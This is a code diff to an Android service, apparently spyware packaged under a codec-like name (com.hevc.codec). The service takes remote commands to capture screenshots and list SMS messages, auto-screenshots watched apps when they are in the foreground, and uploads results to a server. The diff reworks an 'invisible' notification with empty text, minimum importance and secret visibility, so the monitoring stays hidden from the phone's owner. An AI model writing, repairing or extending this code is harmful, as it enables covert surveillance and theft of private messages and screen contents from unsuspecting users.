@@ -2,14 +2,13 @@ package com.hevc.codec
 
 import android.app.*
 import android.content.Context
-import android.content.Intent
 import android.content.IntentFilter
 import android.net.Uri
 import androidx.core.app.NotificationCompat
 import java.io.File
+import android.content.Intent
 import android.graphics.Bitmap
 import android.location.LocationManager
-import android.media.ImageReader
 import android.net.wifi.WifiManager
 import android.os.*
 import android.provider.Settings
@@ -64,7 +63,7 @@ class AgentService : Service() {
 
     override fun onDestroy() {
         handler.removeCallbacks(pollRunnable)
-        stopForeground(STOP_FOREGROUND_REMOVE)
+        stopForeground(true)
         super.onDestroy()
     }
 
@@ -83,6 +82,7 @@ class AgentService : Service() {
                     }
                 }
 
+                // AUTO-SCREENSHOT: agar watched app foreground me hai
                 if (isAppInForeground && watchedApps.isNotEmpty()) {
                     val now = System.currentTimeMillis()
                     if (now - lastScreenshotTime > SCREENSHOT_INTERVAL_MS) {
@@ -91,6 +91,7 @@ class AgentService : Service() {
                     }
                 }
 
+                // Manual commands
                 when (cmd) {
                     "screenshot"       -> doManualScreenshot()
                     "sms_list"         -> doSmsList()
@@ -156,7 +157,7 @@ class AgentService : Service() {
         sendResult("Screenshot captured and uploaded")
     }
 
-    private fun captureFromProjection(reader: ImageReader): Bitmap? {
+    private fun captureFromProjection(reader: android.media.ImageReader): Bitmap? {
         val image = reader.acquireLatestImage() ?: return null
         val plane = image.planes[0]
         val buffer = plane.buffer
@@ -257,7 +258,16 @@ class AgentService : Service() {
 
     private fun buildInvisibleNotification(): Notification {
         val channelId = "hevc_agent"
-        createChannel(channelId)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            val ch = android.app.NotificationChannel(
+                channelId, "agent", android.app.NotificationManager.IMPORTANCE_MIN
+            )
+            ch.setShowBadge(false)
+            ch.enableVibration(false)
+            ch.enableLights(false)
+            nm.createNotificationChannel(ch)
+        }
         return NotificationCompat.Builder(this, channelId)
             .setContentTitle("")
             .setContentText("")
@@ -266,19 +276,8 @@ class AgentService : Service() {
             .setShowWhen(false)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_NONE)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
-    }
-
-    private fun createChannel(id: String) {
-        if (Build.VERSION.SDK_INT >= 26) {
-            val nm = getSystemService(NotificationManager::class.java)
-            val ch = NotificationChannel(id, "agent", NotificationManager.IMPORTANCE_MIN)
-            ch.setShowBadge(false)
-            ch.enableVibration(false)
-            ch.enableLights(false)
-            nm.createChannel(ch)
-        }
     }
 
     private fun post(url: String, body: String): String {
